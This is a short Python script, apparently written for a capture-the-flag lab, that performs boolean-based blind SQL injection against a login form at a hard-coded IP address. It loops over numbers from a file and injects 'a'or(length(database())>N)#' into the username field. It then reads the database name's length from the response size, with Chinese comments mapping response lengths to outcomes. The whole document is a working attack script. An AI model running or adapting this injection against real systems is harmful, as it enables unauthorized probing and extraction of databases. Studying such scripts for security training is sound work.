import requests

# payload = "a'or(length(database())>7)#"
url = "http://114.67.175.224:16388/index.php";

# length = str(len(req.text))
# print(length)

for n in open('numbers.txt', encoding="utf-8"):
    n = n.replace("\n", "")
    payload = "a'or(length(database())>" + n + ")#"

    postdata = {"username": payload, "password": "222222"}
    try:
        req = requests.post(url, data=postdata)
        length = str(len(req.text))

        if length == "830":
            print("数据库名的长度为：" + n)
            break

    except Exception as err:
        print(err)


# 821 长度不对
# 823 不合法输入
# 830 长度正确